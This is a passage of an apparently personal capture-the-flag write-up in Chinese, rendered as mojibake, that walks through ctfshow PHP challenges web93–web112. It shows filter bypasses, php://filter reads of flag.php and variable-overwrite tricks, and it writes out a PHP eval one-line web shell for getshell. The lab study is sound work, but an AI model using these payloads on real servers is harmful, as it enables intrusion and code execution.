src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214938240.png" alt="image-20221218214938240"></p><p>è™½ç„¶è¿‡æ»¤äº†å­—æ¯   æˆ‘ä»¬è¿˜å¯ä»¥ç”¨8è¿›åˆ¶è¡¨ç¤º</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215152296.png" alt="image-20221218215152296"></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215237018.png" alt="image-20221218215237018"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215849892.png" alt="image-20221218215849892"></p><p>å…ˆç”¨4476_è¿‡æ»¤æ‰ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªifï¼Œå› ä¸ºç¬¬ä¸‰ä¸ªå‡½æ•°è¦æ±‚å‚æ•°é‡Œå¿…é¡»å¾—æœ‰0ï¼Œæ‰€ä»¥åœ¨æœ«å°¾åŠ ä¸€ä¸ª0ï¼Œå°±èƒ½æˆåŠŸç»•è¿‡äº†ã€‚</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220051775.png" alt="image-20221218220051775"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220710727.png" alt="image-20221218220710727"></p><p>åŠ å·æˆ–è€…ç©ºæ ¼éƒ½èƒ½ç»•è¿‡     è¿™ä¸¤ä¸ªçš„urlç¼–ç ä¹Ÿèƒ½ç»•è¿‡ã€‚</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220854093.png" alt="image-20221218220854093"></p><p> <strong>è§£æ³•ä¸€</strong></p><p>åˆ©ç”¨phpä¸ºåè®®</p><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151615862.png" alt="image-20221219151615862"></p><p><strong>è§£æ³•äºŒ</strong></p><p><code>./</code>ä»£è¡¨å½“å‰ç›®å½•ä¸‹  æ‰€ä»¥</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151722800.png" alt="image-20221219151722800"></p><p><strong>è§£æ³•ä¸‰</strong></p><p>åˆ©ç”¨å½“å‰ç›®å½•çš„è·¯å¾„</p><p><code>/var/www/html</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151841812.png" alt="image-20221219151841812"></p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152132776.png" alt="image-20221219152132776"></p><p>åˆ©ç”¨æ•°ç»„ç»•è¿‡md5å¼ºç­‰äº</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152207405.png" alt="image-20221219152207405"></p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152512769.png" alt="image-20221219152512769"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219155526819.png" alt="image-20221219155526819"></p><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªä¸‰å…ƒè¿ç®—ç¬¦</p><!--if(æ¡ä»¶)?true:false-->     å°±æ˜¯æ¡ä»¶æˆç«‹çš„è¯è¿”å›trueé‡Œçš„å€¼     ä¸æˆç«‹çš„è¿”å›falseé‡Œçš„å€¼é¦–å…ˆå…ˆåˆ†æä»£ç ï¼Œ$_GETå¦‚æœåˆšå¼€å§‹æ²¡èµ‹å€¼çš„è¯å°±ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¸‹é¢çš„æ¡ä»¶éƒ½ä¸ä¼šæˆç«‹äº†ï¼Œå› ä¸º$__GETå¿…é¡»å¾—æ˜¯ä¸ªæ•°ç»„æ‰èƒ½æ‹¿åˆ°flag,**ç¬¬ä¸€æ­¥**å¾—å…ˆç»™GETéšä¾¿ä¼ ç‚¹å€¼è®©å…¶ä¸ºtrueä½¿å…¶è¿”å›```$_GET=&$_POST```å˜æˆpostå‹çš„æ•°ç»„ï¼Œç„¶åä¸‹ä¸€è¡Œçš„$_GETå°±ä¼šå˜æˆ$__POSTã€‚**ç¬¬äºŒæ­¥**ç„¶åç»™POSTçš„flagä¼ å€¼ä¸ºflagï¼Œä½¿å…¶è½¬ä¸ºCOOKIE,é‚£ä¹ˆç¬¬ä¸‰è¡Œçš„$__GETå°±ä¼šå˜æˆ$â€”COOKIE ï¼Œåˆå› ä¸ºCOOKIEçš„flagæ²¡æœ‰æ²¡æœ‰å€¼ï¼Œå°±ä¼šè¿”å›flagï¼Œè€Œä¸æ˜¯SERVERã€‚**æœ€åä¸€æ­¥**æ‰€ä»¥æœ€åä¸€è¡Œçš„GETå°±ä¸ºCCOKIEäº†ï¼Œæœ€ååªè¦åœ¨COOKIEé‡Œæ·»åŠ HTTP_FLAG=flagå°±å¯ä»¥æˆåŠŸè¾“å‡ºflagäº†## web99æºç ![image-20221219160616968](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219160616968.png)array_push()   --->çš„æ„æ€æ˜¯é rand(1,$i)åœ¨1åˆ°$iä¹‹é—´äº§ç”Ÿçš„éšæœºæ•°ï¼Œç„¶åèµ‹å€¼åˆ°$allowå°¾éƒ¨é‡Œin_array()   ----> åˆ¤æ–­$_GETé‡Œçš„å€¼æ˜¯å¦åœ¨$allowé‡Œè¿™é“é¢˜å°±å­˜åœ¨è¿™ä¸ªæ¼æ´åœ¨è¿™é‡Œã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢eg:n=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163711057.png" alt="image-20221219163711057"></p><p>æ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163915275.png" alt="image-20221219163915275"></p><p>å…ˆçœ‹æ•°ç»„é‡Œæœ‰æ²¡æœ‰3è¿™ä¸ªæ•°å­—ï¼Œæœ‰çš„è¯çœ‹èƒ½ä¸èƒ½å†™å…¥ä¸œè¥¿ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163942094.png" alt="image-20221219163942094"></p><p>èƒ½å†™å…¥ï¼Œç„¶åå°±å¯ä»¥è¿›è¡Œgetshelläº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨contentå¤„å†™å…¥   &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164220854.png" alt="image-20221219164220854"></p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164409059.png" alt="image-20221219164409059"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é“é¢˜å…ˆçœ‹$v0é‚£é‡Œï¼Œæ˜¯èµ‹å€¼å’Œé€»è¾‘è¿ç®—ç¬¦ç›¸åŠ åœ¨ä¸€èµ·ï¼Œä½†æ˜¯é€»è¾‘è¿ç®—ç¬¦çš„çš„ä¼˜å…ˆçº§æ²¡æœ‰èµ‹å€¼çš„é«˜ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦çœ‹v1å°±è¡Œï¼Œåé¢çš„ä¸ä¸€å®šå¾—æ˜¯æ•°å­—äº†ã€‚</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219171715178.png" alt="image-20221219171715178"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºv2ä¸èƒ½å¸¦;ï¼Œæ‰€ä»¥ç”¨?&gt;æŠŠå®ƒç»™æ›¿æ¢æ‰äº† %23æ˜¯#å·ï¼ŒæŠŠåé¢çš„ä¸œè¥¿ç»™è¿‡æ»¤æ‰äº†ã€‚v2å°±æ˜¯ä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·å†™å‘¢ï¼Œå°±æ˜¯evalæ¯”è¾ƒç‰¹æ®Šï¼Œä»–æ˜¯è¿™æ ·çš„&lt;?php  æ‰€ä»¥æˆ‘ä»¬å‰é¢åŠ çš„?&gt;æ˜¯ä¸ºäº†ä¸å®ƒé—­åˆ</span><br><span class="line"> ctfshow.phpæ˜¯/var/www/htmlç›®å½•ä¸‹çš„   å› ä¸ºflag36d.txtæ˜¯å‡çš„flag.</span><br></pre></td></tr></table></figure><p>0x2d   â€”-&gt;   æŒ‡çš„æ˜¯-     æ›¿æ¢åä»¥ctfshow{xxxx}æäº¤å°±è¡Œ</p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219172440204.png" alt="image-20221219172440204"></p><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯åå°„ç±»çš„å«ä¹‰ï¼Œæˆ‘ä¹Ÿä¸å¤ªæ‡‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205625421.png" alt="image-20221219205625421"></p><p>å› ä¸ºflagä¸€èˆ¬æ˜¯uuidçš„ï¼Œæœ‰16ä½uiï¼Œè¿™æ‰æœ‰15ä½ï¼Œæ‰€ä»¥å¾—åŠ ä¸€ä¸ªåœ¨æœ€åä¸€ä¸ªä½ç½®ä¸Š   <strong>0-f</strong></p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205806760.png" alt="image-20221219205806760"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é“é¢˜çš„éš¾ç‚¹æ˜¯å¦‚ä½•æ„é€ v2,çœ‹äº†é¢˜ç›®ç»™çš„è§£åæ‰å‘ç°</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223237023.png" alt="image-20221219223237023"></p><p>å®ƒè¿™ä¸ªæ„é€ å°±å¾ˆå·§å¦™äº†ï¼Œå› ä¸ºè¿™ä¸ªeå¯ä»¥å½“ä½œç§‘å­¦è®¡æ•°æ³•æ¥çœ‹ï¼Œæ‰€ä»¥åˆšå¥½ç¬¦åˆé¢˜ç›®è¦æ±‚ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223434325.png" alt="image-20221219223434325"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223442861.png" alt="image-20221219223442861"></p><p>è¿™ä¸ªå°±æ˜¯å…ˆè¿›è¡Œbase64ç¼–ç ï¼Œç„¶ååœ¨è¿›è¡Œ16è¿›åˆ¶è½¬æ¢å¾—åˆ°çš„ç»“æœã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªå‰é¢æ„é€ çš„16è¿›åˆ¶å‰é¢çš„æ•°å­—ç›¸å½“äº0xï¼Œå¯ä»¥ä¸è¦ï¼Œå»æ‰ä¹Ÿä¸å½±å“ï¼Œæ‰€ä»¥ä¸ºäº†èƒ½ç»•è¿‡ï¼Œå°±ç»™0xæ›¿æ¢æˆ11äº†.</span><br></pre></td></tr></table></figure><p>å› ä¸ºé¢˜ç›®ç»™çš„substrä¼šæŠŠå‰ä¸¤ä½ç»™å»æ‰ï¼Œæ‰€ä»¥ä¸å½±å“æœ€ç»ˆç»“æœã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åv3ä¼ çš„phpä¼ªåè®®æ˜¯è§£ç çš„ï¼Œæ‰€ä»¥æ˜¯å…ˆè¿›è¡Œ16è¿›åˆ¶è½¬æ¢ï¼Œç„¶ååœ¨è¿›è¡Œbase64è§£ç ï¼Œç„¶åå†™å…¥2.phpé‡Œã€‚</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219224415157.png" alt="image-20221219224415157"></p><p>è®¿é—®2.phpå¾—åˆ°flagã€‚</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219225709345.png" alt="image-20221219225709345"></p><p>å’Œä¸Šä¸€é¢˜çš„è§£æ³•ä¸€æ ·</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230835495.png" alt="image-20221219230835495"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230941622.png" alt="image-20221219230941622"></p><p>å’Œmd5å·®ä¸å¤šï¼Œéƒ½æ˜¯åŠ å¯†å‡½æ•°</p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219231030575.png" alt="image-20221219231030575"></p><p>ç›´æ¥ä»¤å€¼ç›¸ç­‰ä¹Ÿè¡Œã€‚</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219234917550.png" alt="image-20221219234917550"></p><p>foreaché‡Œé¢æŒ‡çš„å°±æ˜¯è¿™ä¸ª  â€”-&gt; $_GET[key]=value</p><p><script type="math/tex">key=</script>value;   â€”â€”- &gt;è¿™ä¸ªæ˜¯å€¼è¦†ç›–</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219235048002.png" alt="image-20221219235048002"></p><p>è‡ªå·±çœ‹pl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€æ­¥ï¼Œsuces=flagçš„åŸå› æ˜¯ä¸ºäº†ç»•è¿‡ç¬¬ä¸€è¡Œçš„foreaché‡Œé¢çš„die()ï¼Œæ‰€ä»¥åˆ©ç”¨äº†suces,ç„¶åæ ¹æ®å€¼è¦†ç›–ï¼Œsuceså°±ç­‰äº$flag.ç„¶åç¬¬äºŒä¸ªpostçš„è¯ï¼Œå°±æ˜¯ä¸ºäº†ç»•è¿‡die()ï¼Œç„¶åè¿›è¡Œå€¼è¦†ç›–ï¼Œé‚£ä¹ˆerrorå°±ç­‰äº$flagäº†ï¼Œç„¶åå› ä¸ºæ²¡æœ‰post flag,æ‰€ä»¥æ‰§è¡Œdie($error)å°±ç­‰äºdie($flag).ç„¶åå°±ä¼šè¾“å‡ºflag.</span><br></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143719767.png" alt="image-20221220143719767"></p><p>è¿™é“é¢˜å¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143807143.png" alt="image-20221220143807143"></p><p>è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°flag.</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143934377.png" alt="image-20221220143934377"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145147822.png" alt="image-20221220145147822"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ€è·¯å°±æ˜¯ç»™v1éšä¾¿ç»™ä¸ªå€¼ï¼Œå› ä¸ºæ‰¾ä¸åˆ°flagè¿™ä¸ªkeyï¼Œæ‰€ä»¥ä¼šè¿”å›false,ç„¶åmd5ä¼ ä¸€ä¸ªæ•°ç»„ï¼Œmd5ä¹Ÿä¸ä¼šè§£ææ•°ç»„ï¼Œä¹Ÿä¼šè¿”å›false.æ‰€ä»¥ç›¸ç­‰ï¼Œç„¶åå°±ä¼šè¾“å‡ºflag.</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145531165.png" alt="image-20221220145531165"></p><p>è¿™å°±æ˜¯å®˜æ–¹è§£ï¼Œç»™çš„æ•°å­—çš„å«ä¹‰ã€‚</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128144485">https://blog.csdn.net/qq_63548648/article/details/128144485</a>    å¯ä»¥çœ‹ä¸‹æˆ‘å†™çš„</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145632097.png" alt="image-20221220145632097"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220154959505.png" alt="image-20221220154959505"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00æ˜¯ä¸€ä¸ªæˆªæ–­å­—ç¬¦ï¼Œå°±æ˜¯ä»£è¡¨ç€ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°è¿™å°±ç»“æŸäº†ï¼Œåé¢çš„ä¸œè¥¿å°†ä¸ä¼šåœ¨ç»§ç»­éå†äº†ã€‚</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç¬¬ä¸€ä¸ªifå°±æ˜¯ä¸€ä¸ªä»¥aå¼€å¤´å¹¶ä¸”ä»¥aç»“å°¾çš„ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶åå› ä¸º36dè½¬ä¸º10è¿›åˆ¶æ˜¯877ï¼Œç„¶åæ ¹æ®é¢˜ç›®ç»™çš„é€†è½¬å‡½æ•°å°±å¾—è¾“å…¥778ï¼Œç„¶åå‡½æ•°é€†è½¬å°±å¯ä»¥ç­‰äº36däº†ã€‚</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220155405748.png" alt="image-20221220155405748"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162752867.png" alt="image-20221220162752867"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åŠ å·çš„å«ä¹‰å°±æ˜¯æœ‰ä¸€ä¸ªæ˜¯å­—æ¯å°±è¡Œ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é“é¢˜å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œå°±æ˜¯åˆ©ç”¨exception::__toString   è¿™ä¸ªå†…ç½®å‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162429252.png" alt="image-20221220162429252"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªå‡½æ•°å°±æ˜¯echo new Exception(&#x27;aaaa&#x27;)  ---&gt;ä¼šç›´æ¥è¾“å‡ºaaaaçš„æŠ¥é”™ä¿¡æ¯  é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œrceäº†</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿˜æœ‰ä¸€ç§å°±æ˜¯ $a=&#x27;phpinfo&#x27;;$a();   è¿™ç§å°±ä¼šç›´æ¥è¾“å‡ºphpinfo()çš„ç•Œé¢</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163200636.png" alt="image-20221220163200636"></p><p>ç„¶åç›´æ¥è®¿é—®fl36dg.txtï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿åˆ°flagã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163250189.png" alt="image-20221220163250189"></p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220165208448.png" alt="image-20221220165208448"></p><p>è¿™é“é¢˜å› ä¸ºå¥½å¤šä¸œè¥¿éƒ½è¢«ğŸˆ²äº†ï¼Œé‚£ä¹ˆåªèƒ½ç”¨å­—æ¯äº†ï¼Œé‚£ä¹ˆsystem(ls)è‚¯å®šè¡Œä¸é€šäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å»å¯»æ‰¾å…¶ä»–å¯ä»¥ç”¨æ¥æŸ¥çœ‹ç›®å½•çš„æ–¹æ³•äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//filesystemiterator  æ˜¯ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨æ¥éå†æ–‡ä»¶  //ç»§æ‰¿ç±»</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//directoryItrerator  æ˜¯ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨æ¥éå†ç›®å½•  //çˆ¶ç±»</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™ç§ç±»å‹çš„é¢˜éƒ½æ˜¯åˆ©ç”¨toStringæ–¹æ³•  echo new xxxxxxxx;</span><br></pre></td></tr></table></figure><p><strong>å†™æ³•ä¸€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(diename(__FILE__))</span><br></pre></td></tr></table></figure><p><strong>å†™æ³•äºŒ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(&#x27;.&#x27;)   .  ----&gt;æ˜¯æŒ‡å½“å‰ç›®å½•</span><br></pre></td></tr></table></figure><p><strong>å†™æ³•ä¸‰</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(/var/www/html)</span><br></pre></td></tr></table></figure><p><strong>å†™æ³•å››</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(getcwd())   getcwd()  ----&gt; å–å¾—å½“å‰å·¥ä½œç›®å½•</span><br></pre></td></tr></table></figure><p><strong>å†™æ³•äº”</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator(getcwd())   ---&gt;åªä¼šè¿”å›å½“å‰æ–‡ä»¶ç›®å½•çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶</span><br></pre></td></tr></table></figure><p><strong>å†™æ³•å…­</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator  ä¹Ÿå¯ä»¥åˆ©ç”¨   directoryItreratorä¸Šé¢çš„å†™æ³•ï¼Œæ–¹æ³•æ˜¯ä¸€æ ·çš„</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220170850889.png" alt="image-20221220170850889"></p><p>è¿™é‡Œçš„æ–‡ä»¶åæ’åºæ˜¯æŒ‰ç…§æ–‡ä»¶é¦–å­—æ¯æ¥æ’åºçš„ï¼Œå› ä¸ºfæ’åœ¨å‰é¢ï¼Œæ‰€ä»¥å…ˆè¾“å‡ºflagã€‚</p><p>ç„¶åè®¿é—®fl36dga.txtå°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220171126721.png" alt="image-20221220171126721"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é“é¢˜è€ƒå¯Ÿçš„ç‚¹æ˜¯å€¼è¦†ç›–ï¼Œå› ä¸ºv1åªéœ€è¦åŒ…å«ctfshowå°±è¡Œï¼Œé‚£ä¹ˆæƒ³è¦æ‹¿åˆ°flagï¼Œå°±å¾—ç”¨v2ç»™v1è¦†ç›–æ‰ï¼Œå› ä¸ºå‡½æ•°ä½“å†…è®¿é—®çš„å€¼ï¼Œåªèƒ½è®¿é—®ä¼ è¿›æ¥çš„ï¼Œå› ä¸ºè¿›è¡Œå€¼è¦†ç›–äº†ï¼Œæ‰€ä»¥è®¿é—®ä¸åˆ°ï¼Œé‚£ä¹ˆå°±å¾—ä½¿ç”¨å…¨å±€å˜é‡æ¥è¿›è¡Œè®¿é—®äº†ã€‚</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211211535.png" alt="image-20221220211211535"></p><p>åˆ©ç”¨çš„æ˜¯GLOBALS,å…¨å±€å˜é‡ã€‚</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p>æºç </p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211312978.png" alt="image-20221220211312978"></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿™é“é¢˜é€šè¿‡è¿‡æ»¤çš„ä¸œè¥¿ï¼Œå’Œis_file()è¿™ä¸ªå‡½æ•°ï¼Œå°±èƒ½åˆ¤æ–­å‡ºè¿™æ˜¯éœ€è¦phpä¼ªåè®®åšçš„</span><br><span class="line">is_file()   è¿™ä¸ªå¯ä»¥ä¸å½±å“file_get_contents   highlight_file</span><br></pre></td></tr></table></figure><p>is_file()  </p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220212932303.png" alt="image-20221220212932303"></strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213031242.png" alt="image-20221220213031242"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºphp://filter/resource=flag.php  ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œæ‰€ä»¥ä¼šè¿”å›falseï¼Œç»•è¿‡ç¬¬ä¸€å±‚çš„ifåˆ¤æ–­ï¼Œç„¶åé€šè¿‡phpä¼ªåè®®ä¼ çš„flag.phpå°±å¯ä»¥æˆåŠŸè¾“å‡ºäº†ã€‚  è¿™ä¸ªä¼ªåè®®æ˜¯æŠŠè¿‡æ»¤å™¨ç»™å»æ‰åçš„æ ·å­</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213352149.png" alt="image-20221220213352149"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸å»æ‰åˆ©ç”¨åˆ«çš„è¿‡æ»¤å™¨ä¹Ÿè¡Œï¼Œè¿™æ˜¯å®˜æ–¹çš„wp</span><br></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p>æºç </p><p><img 